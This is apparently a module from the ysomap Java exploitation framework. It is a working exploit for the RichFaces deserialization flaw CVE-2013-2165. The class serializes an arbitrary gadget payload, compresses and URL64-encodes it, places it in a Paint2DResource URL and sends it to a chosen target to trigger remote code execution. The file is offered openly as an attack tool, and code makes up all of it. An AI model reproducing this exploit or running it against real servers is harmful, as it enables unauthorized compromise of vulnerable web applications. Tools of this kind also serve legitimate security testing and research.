package ysomap.exploits.richfaces;

import org.ajax4jsf.util.base64.URL64Codec;
import ysomap.common.annotation.*;
import ysomap.common.util.Status;
import ysomap.core.serializer.Serializer;
import ysomap.core.util.HTTPHelper;
import ysomap.exploits.AbstractExploit;
import ysomap.payloads.Payload;

import java.util.zip.Deflater;

/**
 * @author wh1t3p1g
 * @since 2022/7/5
 */
@Exploits
@Authors({Authors.WH1T3P1G})
@Require(bullets = {"all gadgets"}, param = false)
@Details("Richfaces 反序列化漏洞exploit，CVE-2013-2165")
public class RichFacesExploit extends AbstractExploit {

    @NotNull
    @Require(name = "target", detail = "target，仅需http://host/ 其他部分填充另外的参数")
    public String target;

    @NotNull
    @Require(name = "prefix", detail = "richfaces url的前缀")
    public String prefix;

    @NotNull
    public Payload payload;

    public String payloadName;

    @Override
    public void work() {
        try{
            Serializer serializer = payload.getSerializer();
            byte[] data = (byte[]) serializer.serialize(payload);
            byte[] encoded = encrypt(data);
            String url = String.format("%s/%sorg.richfaces.renderkit.html.Paint2DResource/DATA/%s.jsf", target, prefix, new String(encoded));
            url = url.replace("//", "/");
            System.out.println(url);
            HTTPHelper.get(url, null, false);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private byte[] encrypt(byte[] src) throws Exception {
        try {
            Deflater compressor = new Deflater(1);
            byte[] compressed = new byte[src.length + 100];
            compressor.setInput(src);
            compressor.finish();
            int totalOut = compressor.deflate(compressed);
            byte[] zipsrc = new byte[totalOut];
            System.arraycopy(compressed, 0, zipsrc, 0, totalOut);
            compressor.end();
            return URL64Codec.encodeBase64(zipsrc);
        } catch (Exception var6) {
            throw new Exception("Error encode resource data", var6);
        }
    }

    @Override
    public void stop() {
        status = Status.STOPPED;
    }
}
